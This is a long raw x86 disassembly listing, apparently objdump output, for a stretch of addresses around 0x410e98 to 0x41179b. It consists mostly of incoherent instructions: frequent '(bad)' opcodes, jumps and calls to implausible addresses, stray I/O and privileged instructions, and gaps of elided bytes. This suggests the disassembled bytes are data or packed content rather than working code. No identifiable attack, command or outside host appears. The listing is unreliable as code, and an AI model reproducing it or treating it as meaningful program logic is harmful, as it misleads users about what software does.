  410e98:	(bad)  
  410e99:	jmp    0xc2a57942
  410e9e:	retf   
  410e9f:	pop    eax
  410ea0:	mov    ah,BYTE PTR [edi+eax*8]
  410ea3:	dec    edx
  410ea4:	shl    ecx,0xa4
  410ea7:	lods   eax,DWORD PTR ds:[esi]
  410ea8:	mov    bh,BYTE PTR [ebp+0x16]
  410eab:	loopne 0x410f0c
  410ead:	inc    esp
  410eae:	arpl   WORD PTR [eax-0xa],bx
  410eb1:	fild   DWORD PTR [eax]
	...
  410ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec8:	inc    ebx
  410ec9:	inc    BYTE PTR [edx]
  410ecb:	jle    0x410f25
  410ecd:	je     0x410eb0
  410ecf:	mov    esp,0xca46fec0
  410ed4:	or     al,0xc0
  410ed6:	out    dx,al
  410ed7:	sub    BYTE PTR [esi-0x1],ch
  410eda:	call   0xe1b56683
  410edf:	jl     0x410f3c
  410ee1:	xor    DWORD PTR [esi],esp
  410ee3:	push   0xc
  410ee5:	rcl    BYTE PTR [ecx+ebp*4-0x5b167697],0x2
  410eed:	call   DWORD PTR [eax+eiz*4+0x7cf17457]
  410ef4:	loopne 0x410ef4
  410ef6:	inc    BYTE PTR [ebx+0x4ce17458]
  410efc:	adc    BYTE PTR [edx],bh
  410efe:	out    dx,al
  410eff:	jae    0x410f0d
  410f01:	rcr    BYTE PTR [ebp+eiz*4+0x6b],0x70
  410f06:	fcompp 
  410f08:	jmp    edi
  410f0a:	mov    al,ds:0xe2fe579c
  410f0f:	fs into 
  410f11:	add    DWORD PTR [eax],eax
  410f13:	aad    0x62
  410f15:	std    
  410f16:	jne    0x410eae
  410f18:	jmp    0x410f39
  410f1a:	cmp    DWORD PTR [ecx-0x4a],edx
  410f1d:	or     eax,eax
  410f1f:	fild   DWORD PTR [ebx+ebp*8]
  410f22:	push   ebp
  410f23:	mov    dh,0x90
  410f25:	and    eax,0x73b68e41
  410f2a:	or     BYTE PTR [eax],al
	...
  410f40:	es cdq 
  410f42:	cmp    bh,bh
  410f44:	and    DWORD PTR [edx],ecx
  410f46:	shl    BYTE PTR [ebp+0x7c],0xea
  410f4a:	inc    eax
  410f4b:	call   FWORD PTR [ebx+0xb]
  410f4e:	call   0xfdf725ed
  410f53:	or     edi,esi
  410f55:	das    
  410f56:	add    bl,ch
  410f58:	stos   BYTE PTR es:[edi],al
  410f59:	mov    ch,0x73
  410f5b:	or     dh,dl
  410f5d:	mov    cl,0x36
  410f5f:	call   ecx
  410f61:	or     al,al
  410f63:	jne    0x410fa1
  410f65:	jmp    0x87e8:0xaebff24
  410f6c:	sbb    al,0xb6
  410f6e:	std    
  410f6f:	adc    esi,0x23
  410f72:	ja     0x410f76
  410f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f75:	mov    esi,0x522ac009
  410f7a:	cmp    eax,DWORD PTR [eax]
  410f7c:	push   cs
  410f7d:	push   ebx
  410f7e:	(bad)  
  410f7f:	jb     0x410f83
  410f81:	jp     0x410f82
  410f83:	(bad)  
  410f84:	inc    BYTE PTR [edx]
  410f86:	jmp    0x410f8d
  410f88:	add    al,BYTE PTR gs:[eax]
  410f8b:	add    dh,cl
  410f8d:	mov    ecx,eax
  410f8f:	pop    ebx
  410f90:	xchg   ecx,eax
  410f92:	push   es
  410f93:	add    BYTE PTR [ebx],bh
  410f95:	mov    ch,dl
  410f97:	push   0x3f1c9f
  410f9c:	(bad)  
  410f9d:	das    
  410f9e:	inc    edx
  410fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fa1:	xor    BYTE PTR [edx+0x74],bl
	...
  410fb8:	add    BYTE PTR [ebx-0x40f82fb8],ah
  410fbe:	push   es
  410fbf:	pop    ebx
  410fc0:	(bad)  
  410fc1:	mov    al,ds:0xbd744251
  410fc6:	mov    eax,ss
  410fc8:	or     edx,DWORD PTR [eax-0x4f17f3f1]
  410fce:	pushf  
  410fcf:	pop    edx
  410fd0:	(bad)  
  410fd1:	lods   al,BYTE PTR ds:[esi]
  410fd2:	stos   DWORD PTR es:[edi],eax
  410fd3:	ror    BYTE PTR [edx],1
  410fd5:	js     0x410fce
  410fd7:	pop    es
  410fd8:	(bad)  
  410fd9:	cli    
  410fda:	arpl   WORD PTR [edx+0x7],bp
  410fdd:	push   0x65c85a7d
  410fe2:	push   esp
  410fe3:	add    dl,BYTE PTR [ebp+0x2c]
  410fe6:	add    BYTE PTR [esi-0x4d06b43d],0x67
  410fed:	(bad)  
  410fee:	mov    ebp,0x3a38ffc3
  410ff3:	add    eax,ebx
  410ff5:	cmp    BYTE PTR [ecx],al
  410ff7:	aas    
  410ff8:	out    0x65,eax
  410ffa:	xchg   ecx,eax
  410ffb:	pop    ecx
  410ffc:	(bad)  
  410ffd:	pusha  
  410ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fff:	jmp    WORD PTR [eax]
  411002:	ins    BYTE PTR es:[edi],dx
  411003:	add    cl,BYTE PTR [ebp-0x184c409e]
  411009:	push   ds
  41100a:	pop    ebx
  41100b:	pop    ecx
  41100c:	(bad)  
  41100d:	and    al,0x9f
  41100f:	data16 (bad) 
  411011:	jnp    0x411016
  411013:	mov    DWORD PTR [ebx+ecx*1-0x64],eax
  411017:	push   0x79
  411019:	mov    dh,0x4
  41101b:	pop    ebx
  41101c:	add    BYTE PTR [eax],0x0
	...
  41102f:	add    BYTE PTR [eax],al
  411031:	add    BYTE PTR [edx-0x11],ch
  411034:	add    esi,DWORD PTR [ebp-0x52]
  411037:	out    0xc0,al
  411039:	jmp    0x4110b2
  41103b:	add    ebp,edi
  41103d:	xor    al,dl
  41103f:	test   DWORD PTR fs:[ebx+edi*4+0x2],edi
  411044:	jmp    0xe8c63b53
  411049:	add    esp,DWORD PTR [edi+0x60542b87]
  41104f:	push   ebp
  411050:	push   ebx
  411051:	push   0x5ac5ebc0
  411056:	mov    eax,ds:0x1204c081
  41105b:	fdiv   DWORD PTR [ebp-0x1b]
  41105e:	leave  
  41105f:	ret    
  411060:	call   0x2b7effd3
  411065:	pusha  
  411066:	scas   al,BYTE PTR es:[edi]
  411067:	add    ch,cl
  411069:	add    esp,DWORD PTR [eax-0x41]
  41106c:	add    BYTE PTR [ebx],0xa7
  41106f:	add    ch,cl
  411071:	mov    bl,ah
  411073:	push   0x18
  411075:	pop    ebx
  411076:	(bad)  [esi+0x15]
  411079:	ins    BYTE PTR es:[edi],dx
  41107a:	push   ebp
  41107b:	mov    eax,0x429d5a75
  411080:	hlt    
  411081:	repz and eax,0xbb0350d7
  411087:	or     BYTE PTR [esi-0x30],bl
  41108a:	inc    eax
  41108b:	push   0x11
  41108d:	pop    ecx
  41108e:	xor    DWORD PTR [ebp+0x61],edx
  411091:	cmp    ebp,DWORD PTR [ecx]
  411093:	iret   
  411094:	push   eax
  411095:	imul   eax,DWORD PTR [eax],0x0
	...
  4110a8:	add    BYTE PTR [eax],al
  4110aa:	add    cl,dl
  4110ac:	adc    edi,DWORD PTR [esi]
  4110ae:	pop    edx
  4110af:	lods   eax,DWORD PTR ds:[esi]
  4110b0:	cmp    DWORD PTR [ebx+0x44d725f0],edi
  4110b6:	add    edx,DWORD PTR [ebx+0x4c82605]
  4110bc:	jmp    0x7600:0x54f8f670
  4110c3:	popf   
  4110c4:	add    ch,cl
  4110c6:	outs   dx,BYTE PTR ds:[esi]
  4110c7:	xor    DWORD PTR [ecx-0x19],ebp
  4110ca:	ret    0x1560
  4110cd:	jmp    0xfffdefa2
  4110d2:	push   0xe57402ad
  4110d7:	cdq    
  4110d8:	cmp    DWORD PTR [ebx-0x79],esi
  4110db:	mov    dl,0x39
  4110dd:	jae    0x4110d8
  4110df:	retf   0x8d04
  4110e2:	sub    al,0x5b
  4110e4:	lds    esp,FWORD PTR [edi+0x23]
  4110e7:	fcmovb st,st(1)
  4110e9:	call   eax
  4110eb:	push   ebx
  4110ec:	mov    edi,0xcefebefe
  4110f1:	jmp    0x4110b4
  4110f3:	add    esp,DWORD PTR [edi+edi*8]
  4110f6:	scas   al,BYTE PTR es:[edi]
  4110f7:	sbb    al,BYTE PTR [ecx+0x5e]
  4110fa:	inc    edx
  4110fb:	in     al,dx
  4110fc:	inc    eax
  4110fd:	push   esp
  4110fe:	jb     0x41110f
  411100:	add    ebx,0x49
  411103:	int    0x54
  411105:	(bad)  
  411106:	ss xor eax,0x6ba64fdc
  41110c:	push   esp
  41110d:	idiv   bl
	...
  411123:	add    BYTE PTR [ebp-0x1bc901c1],ah
  411129:	sbb    al,0x41
  41112b:	jmp    0xf6412654
  411130:	ror    BYTE PTR [eax+0x0],0xe9
  411134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411135:	test   DWORD PTR [ebp+ebx*2-0x4601ab33],eax
  41113c:	neg    DWORD PTR [ebx+0x2f]
  41113f:	mov    eax,ds:0x290a547f
  411144:	scas   al,BYTE PTR es:[edi]
  411145:	jle    0x4110ea
  411147:	call   0x6cc413f0
  41114c:	ja     0x4111a3
  41114e:	(bad)  
  41114f:	es stos DWORD PTR es:[edi],eax
  411151:	add    eax,DWORD PTR [esi+esi*2+0x640002a4]
  411158:	jo     0x4110f5
  41115a:	std    
  41115b:	push   cs
  41115c:	dec    esi
  41115d:	ret    
  41115e:	inc    BYTE PTR [eax]
  411160:	mov    ds:0xd9fffcb2,eax
  411165:	out    0xec,eax
  411167:	aaa    
  411168:	fnstcw WORD PTR [edx-0x7cb809d7]
  41116e:	mov    ds:0xe9bac9fe,al
  411173:	aaa    
  411174:	nop
  411175:	or     DWORD PTR [esi-0x359577c],esi
  41117b:	(bad)  
  41117c:	(bad)  [edi+0x3fd56e66]
  411182:	dec    BYTE PTR [ebx+eax*1+0xfffcbe]
	...
  41119d:	pop    ecx
  41119e:	(bad)  
  41119f:	out    0x41,al
  4111a1:	test   edi,edi
  4111a3:	inc    DWORD PTR [edx-0x7a7304ae]
  4111a9:	dec    esp
  4111aa:	mov    ecx,0xb9aefffd
  4111af:	mov    bl,0xa4
  4111b1:	sbb    BYTE PTR [edx-0x14be1703],bh
  4111b7:	(bad)  
  4111b8:	call   edi
  4111ba:	aam    0xa2
  4111bc:	(bad)  
  4111bd:	fnstcw WORD PTR [edx+0x4fb88344]
  4111c3:	jo     0x411189
  4111c5:	leave  
  4111c6:	test   dl,dh
  4111c8:	(bad)  
  4111c9:	fnstcw WORD PTR [edx-0x46734b1a]
  4111cf:	std    
  4111d0:	mov    ebx,0x69fffc77
  4111d6:	(bad)  
  4111d7:	(bad)  
  4111d8:	dec    DWORD PTR [esi]
  4111da:	add    BYTE PTR gs:[ebp-0x3887d],cl
  4111e1:	mov    ecx,0xa2b5fd8f
  4111e6:	mov    ecx,0x5996fffd
  4111eb:	das    
  4111ec:	jmp    DWORD PTR [edi-0x673ff414]
  4111f2:	fstp   QWORD PTR [edx-0x1]
  4111f5:	loopne 0x41125f
  4111f7:	cmp    DWORD PTR [edi+ebx*1+0x62fe5653],0x26f
	...
  411216:	cwde   
  411217:	fisubr WORD PTR [edx-0x1]
  41121a:	shr    BYTE PTR [eax-0x79],0x84
  41121e:	mov    esp,0x57fe5632
  411223:	sar    edi,0x0
  411226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411227:	imul   ebp,DWORD PTR [edx-0x1d],0xb025bae
  41122e:	addr16 popa 
  411230:	jle    0x411200
  411232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411233:	pop    ebx
  411234:	add    bh,BYTE PTR ds:0x25aa3
  41123a:	mov    al,0xe0
  41123c:	aas    
  41123d:	(bad)  
  41123e:	js     0x41129c
  411240:	push   0x4f
  411242:	popf   
  411243:	pop    ebx
  411244:	add    dl,BYTE PTR [eax-0x1]
  411247:	or     bl,cl
  411249:	inc    eax
  41124a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41124b:	(bad)  
  41124c:	add    cl,0x59
  41124f:	rcl    DWORD PTR [esi+0x4f],1
  411252:	aas    
  411253:	ror    BYTE PTR [ecx],0x0
  411256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411257:	fdivr  QWORD PTR [edi]
  411259:	or     ecx,ebp
  41125b:	pop    ebx
  41125c:	xchg   DWORD PTR [esp+edi*1-0x2801a94e],eax
  411263:	ret    
  411264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411265:	or     BYTE PTR [edi+0x1c84875b],ah
  41126b:	retf   0xfe56
  41126e:	ja     0x411223
  411270:	adc    eax,DWORD PTR [ebx+0x10]
  411273:	sbb    DWORD PTR [ebx],ecx
  411275:	rcl    BYTE PTR [edx+0xe0ebfb],0x0
	...
  41128c:	add    BYTE PTR [eax],al
  41128e:	add    bh,cl
  411290:	add    ch,BYTE PTR [eax+0x21882a03]
  411296:	push   esi
  411297:	icebp  
  411298:	push   ecx
  411299:	mov    eax,0xe0ddf6b
  41129e:	push   edi
  41129f:	xor    edi,DWORD PTR [eax+0x2a]
  4112a2:	push   esi
  4112a3:	fst    DWORD PTR [ecx-0x66]
  4112a6:	mov    bl,0xc8
  4112a8:	repnz mov ah,0x56
  4112ab:	leave  
  4112ac:	pop    ebp
  4112ad:	(bad)  [eax+0x56e6452b]
  4112b3:	mov    ecx,0xad806bb2
  4112b8:	push   eax
  4112b9:	aad    0x56
  4112bb:	pop    eax
  4112bc:	pop    edx
  4112bd:	test   DWORD PTR [edx],ebx
  4112bf:	mov    al,ds:0x5c806f51
  4112c4:	push   eax
  4112c5:	mov    ebp,0x74979156
  4112ca:	push   ebp
  4112cb:	mov    DWORD PTR [ecx-0x53],edx
  4112ce:	nop
  4112cf:	je     0x411321
  4112d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d2:	push   esi
  4112d3:	adc    dh,0xd9
  4112d6:	push   esi
  4112d7:	jno    0x4112d6
  4112d9:	test   al,0xcf
  4112db:	mov    ch,0xda
  4112dd:	sbb    ebx,ecx
  4112df:	out    0x2,eax
  4112e1:	xchg   ecx,eax
  4112e2:	pop    esi
  4112e3:	mov    al,ds:0xc8b3e902
  4112e8:	aad    0x21
  4112ea:	lds    ecx,FWORD PTR [eax+0x50]
  4112ed:	xor    ebx,DWORD PTR [edi+0x6b655142]
	...
  411307:	add    BYTE PTR [ecx],dh
  411309:	lds    ebx,FWORD PTR [ebp+0x56]
  41130c:	mov    esi,0xbd03c303
  411311:	add    cl,BYTE PTR [esi-0x70]
  411314:	pop    esp
  411315:	push   eax
  411316:	inc    ebp
  411317:	push   esi
  411318:	sbb    ch,0xf
  41131b:	lds    edx,FWORD PTR [eax]
  41131d:	(bad)  
  41131f:	call   0xe94ad8a0
  411324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411325:	push   ecx
  411326:	mov    ah,0x65
  411328:	push   edx
  411329:	push   eax
  41132a:	(bad)  
  41132b:	adc    DWORD PTR [ecx+0x18],ecx
  41132e:	call   DWORD PTR [esi]
  411330:	push   ecx
  411331:	xchg   esi,eax
  411332:	mov    ds:0xe750790f,eax
  411337:	dec    ebp
  411338:	test   eax,0x20fefe51
  41133d:	push   ebp
  41133e:	std    
  41133f:	div    BYTE PTR [edx+0x69]
  411342:	add    eax,0xfb5059be
  411347:	sbb    ah,BYTE PTR [ebx-0x76]
  41134a:	(bad)  
  41134b:	ficomp WORD PTR [edx+0x50]
  41134e:	icebp  
  41134f:	xchg   DWORD PTR [ebx-0x4f9bf0f7],ecx
  411355:	push   eax
  411356:	inc    dh
  411358:	push   ecx
  411359:	mov    cl,0xc8
  41135b:	stos   BYTE PTR es:[edi],al
  41135c:	inc    eax
  41135d:	jge    0x41134a
  41135f:	push   0xffffffe7
  411361:	pop    edi
  411362:	addr16 in al,dx
  411364:	add    eax,0x55a10010
  411369:	add    eax,ebx
  41136b:	sahf   
	...
  411380:	add    BYTE PTR [esi],bl
  411382:	xor    ah,BYTE PTR [edi-0x14]
  411385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411386:	add    al,BYTE PTR [eax]
  411388:	cmp    DWORD PTR [ecx+0x19],0x322e86ff
  41138f:	mov    BYTE PTR [edi+ebp*8],ah
  411392:	jl     0x411365
  411394:	add    DWORD PTR [eax+0x3],ecx
  411397:	add    cl,ch
  411399:	int3   
  41139a:	fidiv  WORD PTR [esi]
  41139c:	data16 sar BYTE PTR [ecx+edx*8+0x70],cl
  4113a1:	lock pop edi
  4113a3:	addr16 in al,dx
  4113a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113a6:	add    al,BYTE PTR [eax]
  4113a8:	inc    ecx
  4113a9:	pop    ecx
  4113aa:	sbb    edi,edi
  4113ac:	add    BYTE PTR [ecx+0x79],ah
  4113af:	ror    BYTE PTR [ebx-0x7bc8454],1
  4113b5:	test   DWORD PTR [edx+ecx*4],edx
  4113b8:	shl    dh,cl
  4113ba:	dec    edi
  4113bb:	(bad)  
  4113bc:	dec    DWORD PTR [esi]
  4113be:	mov    bh,0x73
  4113c0:	cld    
  4113c1:	adc    al,0x4
  4113c3:	call   0x451ae3
  4113c8:	mov    ebx,DWORD PTR [ecx+edi*2-0x4ca40030]
  4113cf:	data16 add al,0xbf
  4113d2:	add    eax,DWORD PTR [eax]
  4113d4:	call   0x410f2d
  4113d9:	(bad)
  4113dc:	sysexit 
  4113de:	adc    DWORD PTR [edi+0x78],esp
  4113e1:	jne    0x411426
  4113e3:	(bad)  
  4113e4:	inc    BYTE PTR [eax]
	...
  4113fa:	dec    ebx
  4113fb:	mov    dh,0xe6
  4113fd:	xor    DWORD PTR [esi+0x3c8b0003],eax
  411403:	pop    ecx
  411404:	(bad)  
  411405:	imul   edi,DWORD PTR [esi+0x59],0x597e6a00
  41140c:	add    DWORD PTR [eax-0x72],ebp
  41140f:	add    eax,DWORD PTR [eax]
  411411:	rol    BYTE PTR [ecx+0x40],0xee
  411415:	call   0x3f624c
  41141a:	pop    es
  41141b:	xchg   ecx,eax
  41141c:	repnz inc eax
  41141e:	inc    ebp
  41141f:	ret    
  411420:	jae    0x411466
  411422:	and    DWORD PTR [eax-0x6],eax
  411425:	call   FWORD PTR [ebx-0x4d]
  411428:	out    0xff,al
  41142a:	cmp    DWORD PTR [ebx],eax
  41142c:	add    BYTE PTR [edx-0x4e],ch
  41142f:	pop    esp
  411430:	(bad)  
  411431:	(bad)  
  411432:	pop    ebx
  411433:	mov    bl,0xe6
  411435:	jae    0x41146e
  411437:	add    eax,DWORD PTR [eax]
  411439:	or     esp,DWORD PTR [edi+0x670bcf19]
  41143f:	inc    ecx
  411440:	fimul  DWORD PTR [edx+0x66]
  411443:	pop    ecx
  411444:	mov    dl,0xe7
  411446:	add    al,0x68
  411448:	add    al,BYTE PTR [eax]
  41144a:	jge    0x4114a5
  41144c:	call   0xe89ca350
  411451:	dec    DWORD PTR [esi-0xf0015a4]
  411457:	pop    eax
  411458:	inc    edx
  411459:	(bad)  
  41145a:	jb     0x411445
  41145c:	push   0xffffff95
	...
  411472:	add    BYTE PTR [eax+0x62890259],ch
  411478:	dec    ebp
  411479:	shl    DWORD PTR [ebx+0x3c],0x71
  41147d:	or     BYTE PTR [edx+0x66],0x59
  411481:	push   0xffffff9d
  411483:	test   al,0x59
  411485:	add    dl,BYTE PTR [eax+0x4f]
  411488:	fnstcw WORD PTR [esi-0x27cf58c0]
  41148e:	repz mov edi,0xa0ff14a6
  411494:	or     al,0x53
  411496:	je     0x41142b
  411498:	xor    al,0xce
  41149a:	push   es
  41149b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41149c:	pop    ebx
  41149d:	stos   BYTE PTR es:[edi],al
  41149e:	or     ah,BYTE PTR [edi+0xf]
  4114a1:	push   es
  4114a2:	jmp    0x411488
  4114a4:	pushf  
  4114a5:	fdivr  st,st(3)
  4114a7:	sete   BYTE PTR [esi-0x279358c0]
  4114ae:	idiv   DWORD PTR [edi-0x50]
  4114b1:	sti    
  4114b2:	jmp    DWORD PTR [eax-0x27]
  4114b5:	inc    edi
  4114b6:	or     ecx,edi
  4114b8:	jns    0x411478
  4114ba:	inc    eax
  4114bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114bc:	jae    0x411452
  4114be:	push   es
  4114bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c0:	pop    ebx
  4114c1:	std    
  4114c2:	mov    edi,0xd3da39bb
  4114c7:	in     al,dx
  4114c8:	add    ch,BYTE PTR [eax-0x6fa528fd]
  4114ce:	or     esp,DWORD PTR [edi-0x6bbc1dfe]
  4114d4:	icebp  
  4114d5:	ret    0x3
	...
  4114ec:	lea    eax,[edx]
  4114ee:	inc    esi
  4114ef:	fstp   DWORD PTR [eax]
  4114f1:	dec    esi
  4114f2:	mov    bl,0x53
  4114f4:	sbb    cl,0xff
  4114f7:	les    eax,FWORD PTR [eax]
  4114f9:	fsub   st(0),st
  4114fb:	push   edx
  4114fc:	call   0x890b04e
  411501:	adc    al,0xd7
  411503:	push   edx
  411504:	jmp    0xc894b056
  411509:	sbb    edx,edi
  41150b:	push   edx
  41150c:	(bad)  [ebp+0x7b]
  41150f:	dec    ebx
  411510:	enter  0xb723,0x52
  411514:	leave  
  411515:	cmp    ebp,DWORD PTR [ecx]
  411517:	mov    ebx,0x664bda55
  41151c:	js     0x411520
  41151e:	loope  0x4114f5
  411520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411521:	inc    ecx
  411522:	fisttp QWORD PTR [esi+0x3e902a7]
  411528:	pusha  
  411529:	cli    
  41152a:	sbb    al,0xc5
  41152c:	cwde   
  41152d:	(bad)  
  41152f:	mov    edx,0x53249388
  411534:	mov    DWORD PTR [ecx],esp
  411536:	xchg   ecx,eax
  411537:	dec    edi
  411538:	mov    ch,0x42
  41153a:	outs   dx,DWORD PTR ds:[esi]
  41153b:	push   edx
  41153c:	jns    0x41158b
  41153e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153f:	push   ebp
  411540:	inc    edx
  411541:	or     ah,dh
  411543:	fadd   DWORD PTR [eax+0x1aea979]
  411549:	inc    edx
  41154a:	xor    edi,DWORD PTR [edi+0x4c]
  41154d:	sub    DWORD PTR [ebx+edx*2+0x0],0x0
	...
  411564:	add    ch,dh
  411566:	ficom  DWORD PTR [ebx+0x28865]
  41156c:	jno    0x4115c8
  41156e:	add    al,bl
  411570:	outs   dx,BYTE PTR ds:[esi]
  411571:	and    DWORD PTR [esi],ecx
  411573:	cli    
  411574:	pop    ss
  411575:	push   0x4d
  411577:	(bad)  
  411578:	aad    0x32
  41157a:	cmp    BYTE PTR [ebx+ebp*8],0xc5
  41157e:	ret    
  41157f:	(bad)  
  411580:	call   0x4c40f75
  411585:	popf   
  411586:	sbb    eax,0xd7a4e941
  41158b:	add    al,0x2
  41158d:	imul   ebp,DWORD PTR [eax+0x29992ac8],0xffffffe7
  411594:	int    0x9d
  411596:	add    al,BYTE PTR [eax]
  411598:	ins    BYTE PTR es:[edi],dx
  411599:	das    
  41159a:	dec    ecx
  41159b:	push   ecx
  41159c:	sbb    esp,0xffffffbc
  41159f:	(bad)  
  4115a0:	hlt    
  4115a1:	push   0x1f
  4115a3:	inc    ecx
  4115a4:	jmp    0x654fa27a
  4115a9:	push   esp
  4115aa:	dec    ebp
  4115ab:	(bad)  
  4115ac:	jmp    0xea38dc1e
  4115b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b2:	add    al,BYTE PTR [eax]
  4115b4:	je     0x41159e
  4115b6:	push   esp
  4115b7:	dec    edi
  4115b8:	push   ebx
  4115b9:	mov    ds:0xa442ffd8,eax
  4115be:	dec    ebx
  4115bf:	je     0x41158e
  4115c1:	div    dh
  4115c3:	add    DWORD PTR [esi],edx
  4115c5:	fs dec esp
  4115c7:	or     DWORD PTR [ecx+0x0],ebp
	...
  4115dd:	add    BYTE PTR [eax-0x26],dh
  4115e0:	out    0x39,eax
  4115e2:	scas   al,BYTE PTR es:[edi]
  4115e3:	add    al,BYTE PTR [eax]
  4115e5:	push   0xffffffeb
  4115e7:	leave  
  4115e8:	je     0x4115f3
  4115ea:	sub    cl,bh
  4115ec:	imul   ecx
  4115ee:	push   eax
  4115ef:	stos   BYTE PTR es:[edi],al
  4115f0:	(bad)  
  4115f1:	sbb    al,0xf3
  4115f3:	arpl   WORD PTR [edi-0x2c],di
  4115f6:	test   DWORD PTR [eax+ecx*4+0x0],0x458baa83
  4115fe:	es xchg edi,eax
  411600:	std    
  411601:	jne    0x4115b9
  411603:	mov    cl,0x73
  411605:	hlt    
  411606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411607:	(bad)  
  411608:	(bad)  
  411609:	jne    0x4115d5
  41160b:	mov    cl,0x13
  41160d:	add    bl,BYTE PTR [ecx-0x31f501c1]
  411613:	sub    ch,BYTE PTR [ebx+ecx*4]
  411616:	inc    ebx
  411617:	mov    ah,0x89
  411619:	adc    BYTE PTR [ebx+0x2c50ee43],bl
  41161f:	mov    bl,0x13
  411621:	push   es
  411622:	test   eax,0xce0afe3f
  411627:	sub    bl,BYTE PTR [eax]
  411629:	push   0x3f8dc5
  41162e:	mov    DWORD PTR [ebx],esi
  411630:	out    dx,al
  411631:	call   0x410eda
  411636:	lds    edi,FWORD PTR [edi-0x4d02fe8d]
  41163c:	jae    0x41162e
  41163e:	mov    dh,0xf3
  411640:	add    eax,0x0
	...
  411655:	add    BYTE PTR [eax],al
  411657:	into   
  411658:	mov    dl,0x73
  41165a:	hlt    
  41165b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165c:	dec    ecx
  41165d:	xor    edi,edi
  41165f:	leave  
  411660:	mov    dl,0x73
  411662:	cld    
  411663:	(bad)  
  411664:	cli    
  411665:	add    eax,0xc1ce8e00
  41166a:	pop    ebx
  41166b:	inc    edi
  41166c:	(bad)  
  41166d:	push   ebx
  41166e:	mov    edi,DWORD PTR [edx-0x80]
  411671:	ret    0x48c0
  411674:	mov    dl,0xfd
  411676:	push   ebx
  411677:	out    0x7c,al
  411679:	loope  0x4116bb
  41167b:	mov    ?,WORD PTR [edi-0x4dc2fe90]
  411681:	cmp    DWORD PTR ds:0x40e855,0x1ad659a7
  41168b:	and    al,0x3e
  41168d:	pop    ds
  41168e:	sub    esi,esp
  411690:	pop    ecx
  411691:	add    dh,BYTE PTR [ebp+esi*4-0x28]
  411695:	or     eax,0x41a91fa
  41169a:	add    BYTE PTR [ebx+0x313c8362],dh
  4116a0:	repz ret 0x28ff
  4116a4:	ss add eax,0x398fe72b
  4116aa:	ret    0x10cc
  4116ad:	push   eax
  4116ae:	adc    al,0xbc
  4116b0:	bnd ret 0x1fff
  4116b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116b5:	push   esi
  4116b6:	(bad)  
  4116b7:	sub    ah,BYTE PTR ds:0xfe51
	...
  4116cd:	add    BYTE PTR [eax],al
  4116cf:	add    al,bh
  4116d1:	add    BYTE PTR [ebx],al
  4116d3:	add    BYTE PTR [edi-0x5a95fd91],ah
  4116d9:	icebp  
  4116da:	cdq    
  4116db:	add    eax,0xf78359a7
  4116e0:	fsubr  DWORD PTR [ebx]
  4116e2:	xchg   BYTE PTR ds:0x890259a6,bl
  4116e8:	and    dl,BYTE PTR [ecx]
  4116ea:	push   ecx
  4116eb:	inc    al
  4116ed:	in     eax,0x85
  4116ef:	retf   
  4116f0:	mov    ecx,0xb04f4e5b
  4116f5:	ins    DWORD PTR es:[edi],dx
  4116f6:	cmp    edi,ebp
  4116f8:	test   al,0x2b
  4116fa:	pop    ebx
  4116fb:	lea    ebp,[ecx+0x670b025b]
  411701:	sub    DWORD PTR [esi+0x25ba7f2],eax
  411707:	push   0xffc51579
  41170c:	xor    edx,edi
  41170e:	push   ebx
  41170f:	std    
  411710:	js     0x4116ab
  411712:	mov    bl,0xe7
  411714:	xchg   esi,eax
  411715:	add    ch,dh
  411717:	add    esp,DWORD PTR [edi+0x24ffa8fd]
  41171d:	inc    esi
  41171e:	call   0x6382be26
  411723:	dec    eax
  411724:	push   edx
  411725:	dec    edx
  411726:	test   DWORD PTR [edi+eiz*4],eax
  411729:	add    ch,cl
  41172b:	sub    BYTE PTR [ebx],0x3f
  41172e:	jbe    0x41177f
  411730:	cmp    DWORD PTR [ebx+0x996d],esi
	...
  411746:	add    BYTE PTR [eax],al
  411748:	add    BYTE PTR [ecx+ecx*2+0x65],dl
  41174c:	dec    edi
  41174d:	sub    eax,esi
  41174f:	or     eax,0x6202661d
  411754:	jns    0x41173a
  411756:	dec    eax
  411757:	dec    ebp
  411758:	dec    edi
  411759:	popf   
  41175a:	inc    edx
  41175b:	cmc    
  41175c:	xchg   DWORD PTR [eax],esi
  41175e:	add    ebp,ecx
  411760:	add    edi,DWORD PTR [edi+ebp*4+0x7a23ff3c]
  411767:	call   0x5b8abe6f
  41176c:	cmp    dl,ch
  41176e:	dec    ecx
  41176f:	sbb    eax,0xe8e1e0da
  411774:	add    esp,DWORD PTR [edi-0x56defefc]
  41177a:	add    ch,cl
  41177c:	cli    
  41177d:	or     bh,cl
  41177f:	jg     0x4117fd
  411781:	imul   ecx,DWORD PTR [edx+0x63],0xffffffc9
  411785:	mov    esp,0xa75a80b2
  41178a:	add    al,0xe9
  41178c:	dec    esi
  41178d:	xor    ecx,DWORD PTR [edx-0x23]
  411790:	clc    
  411791:	sahf   
  411792:	sbb    BYTE PTR [eax],ch
  411794:	add    al,0xac
  411796:	inc    edx
  411797:	push   esp
  411798:	lods   al,BYTE PTR ds:[esi]
  411799:	xchg   ecx,eax
  41179a:	iret   
  41179b:	les    ecx,FWORD PTR [esi-0x4d]
